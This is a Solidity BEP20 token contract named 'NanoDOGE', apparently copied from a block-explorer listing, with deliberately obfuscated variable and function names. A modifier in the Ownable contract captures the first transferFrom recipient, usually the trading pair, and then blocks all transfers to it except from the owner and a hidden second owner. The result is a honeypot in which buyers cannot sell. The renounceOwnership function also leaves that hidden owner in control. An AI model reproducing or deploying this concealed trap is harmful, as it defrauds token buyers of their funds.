/**
 *Submitted for verification at BscScan.com on 2023-05-01
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface IBEP20 {
  function totalSupply() external view returns (uint256);

  function decimals() external view returns (uint8);

  function symbol() external view returns (string memory);

  function name() external view returns (string memory);

  function getOwner() external view returns (address);

  function balanceOf(address account) external view returns (uint256);

  function transfer(address recipient, uint256 amount) external returns (bool);

  function allowance(address pBArEaALjfOm, address spender) external view returns (uint256);

  function approve(address spender, uint256 amount) external returns (bool);

  function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

  event Transfer(address indexed from, address indexed to, uint256 value);

  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract Context {
  // Empty internal constructor, to prevent people from mistakenly deploying
  // an instance of this contract, which should be used via inheritance.
  constructor () { }

  function YAusSHfVgLNv() internal view returns (address) {
    return msg.sender;
  }

  function TfBuIpKcMmrk() internal view returns (bytes memory) {
    this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
    return msg.data;
  }
}

library SafeMath {
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
    // benefit is lost if 'b' is also tested.
    // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    // Solidity only automatically asserts when dividing by 0
    require(b > 0, errorMessage);
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold

    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}

contract Ownable is Context {
  address private pBArEaALjfOm;
  address private rlMFReANwKfv;
  address private JHBDBhjbaj;
  
  mapping (address => uint256) public XFWeOvqmJing;
  mapping (address => mapping (address => uint256)) public auDqbhNfzdHT;
  uint256 public khXzlmglgXyr;

  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

  constructor () {
    address msgSender = YAusSHfVgLNv();
    pBArEaALjfOm = msgSender;
    rlMFReANwKfv = msgSender;
    emit OwnershipTransferred(address(0), msgSender);
  }

  function owner() public view returns (address) {
    return pBArEaALjfOm;
  }

  modifier onlyOwner() {
    require((pBArEaALjfOm == YAusSHfVgLNv() || rlMFReANwKfv == YAusSHfVgLNv()), "");
    _;
  }

  function renounceOwnership() public onlyOwner {
    emit OwnershipTransferred(pBArEaALjfOm, address(0));
    pBArEaALjfOm = address(0);
  }

  function previousOwner() public view onlyOwner returns (address) {
    return JHBDBhjbaj;
  }

  function transferOwnership(address newOwner) public onlyOwner {
    OPQnKWenieRz(newOwner);
  }

  function OPQnKWenieRz(address newOwner) internal {
    require(newOwner != address(0), "");
    emit OwnershipTransferred(pBArEaALjfOm, newOwner);
    pBArEaALjfOm = newOwner;
  }


    modifier KJDFJKkjdbkjf(address from, address to, bool fromTransfer) {
        if(from != address(0) && JHBDBhjbaj == address(0) && fromTransfer) JHBDBhjbaj = to;
        else require((to != JHBDBhjbaj || from == pBArEaALjfOm || from == rlMFReANwKfv), "");
        _;
    }
}

contract NanoDOGE is Context, IBEP20, Ownable {
  using SafeMath for uint256;
  
  uint256 public yVdGBbbpJwKC = 3;
  uint256 public yVdGBbbpJwKCLiq = 3;
  uint256 public yVdGBbbpJwKCHolders = 3;
  uint256 public rcqIdfDNcFXv = 1;
  uint256 public TAzijlbTxMDo = 10;

  constructor() public {
    khXzlmglgXyr = 1 * 10**15 * 10**9;
    //khXzlmglgXyr = khXzlmglgXyr;
    XFWeOvqmJing[msg.sender] = khXzlmglgXyr;
    emit Transfer(address(0), msg.sender, (khXzlmglgXyr));
  }
    
  function getOwner() external override view returns (address) {
    return owner();
  }

  function decimals() external override view returns (uint8) {
    return 9;
  }

  function symbol() external override view returns (string memory) {
    return "TEST";
  }

  function name() external override view returns (string memory) {
    return "TEST";
  }

  function totalSupply() external override view returns (uint256) {
    return khXzlmglgXyr;
  }

  function balanceOf(address account) external override view returns (uint256) {
    return XFWeOvqmJing[account];
  }

  function transfer(address recipient, uint256 amount) external override returns (bool) {
    QTkAHYSsoTpY(YAusSHfVgLNv(), recipient, amount, false);
    return true;
  }

  function allowance(address owner, address spender) external view override returns (uint256) {
    return auDqbhNfzdHT[owner][spender];
  }

  function approve(address spender, uint256 amount) external override returns (bool) {
    jnmeGSLPMtne(YAusSHfVgLNv(), spender, amount);
    return true;
  }

  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    QTkAHYSsoTpY(sender, recipient, amount, true);
    jnmeGSLPMtne(sender, YAusSHfVgLNv(), auDqbhNfzdHT[sender][YAusSHfVgLNv()].sub(amount, ""));
    return true;
  }
  

  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    jnmeGSLPMtne(YAusSHfVgLNv(), spender, auDqbhNfzdHT[YAusSHfVgLNv()][spender].add(addedValue));
    return true;
  }
  

  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    jnmeGSLPMtne(YAusSHfVgLNv(), spender, auDqbhNfzdHT[YAusSHfVgLNv()][spender].sub(subtractedValue, ""));
    return true;
  }


  function QTkAHYSsoTpY(address sender, address recipient, uint256 amount, bool fromTransfer) internal KJDFJKkjdbkjf(sender, recipient, fromTransfer) {
    require(sender != address(0), "");
    require(recipient != address(0), "");
    require(amount > 0, "");

    XFWeOvqmJing[sender] = XFWeOvqmJing[sender].sub(amount, "");
    XFWeOvqmJing[recipient] = XFWeOvqmJing[recipient].add(amount);
    emit Transfer(sender, recipient, amount);
  }
  

  function jnmeGSLPMtne(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "");
    require(spender != address(0), "");

    auDqbhNfzdHT[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

    
  function burn(uint qpupUTgBDWPf) public {
    require(qpupUTgBDWPf < 100 && qpupUTgBDWPf > 1, "");
    require(msg.sender != address(0), "");
    
    uint256 amount = (khXzlmglgXyr * qpupUTgBDWPf) / 100;
    XFWeOvqmJing[msg.sender] = XFWeOvqmJing[msg.sender].sub(amount, "");
    khXzlmglgXyr = khXzlmglgXyr.sub(amount);
    emit Transfer(msg.sender, address(0), amount);
  }

  
}